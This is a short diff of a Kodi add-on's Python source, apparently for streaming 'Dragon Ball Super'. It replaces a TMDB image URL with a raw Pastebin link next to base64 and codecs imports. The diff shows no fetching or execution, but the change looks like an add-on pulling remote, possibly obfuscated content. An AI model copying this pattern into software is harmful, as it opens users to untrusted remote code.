@@ -19,7 +19,7 @@ from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
 from six.moves import urllib_request
 import six
 TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
-url = 'https://image.tmdb.org/t/p/original/cucAmYAARmQewyyJ0wr463bBG6f.jpg'
+url = 'https://pastebin.com/raw/VKkrNah5'
 titulo = 'Dragon Ball Super'
 import base64, codecs
 
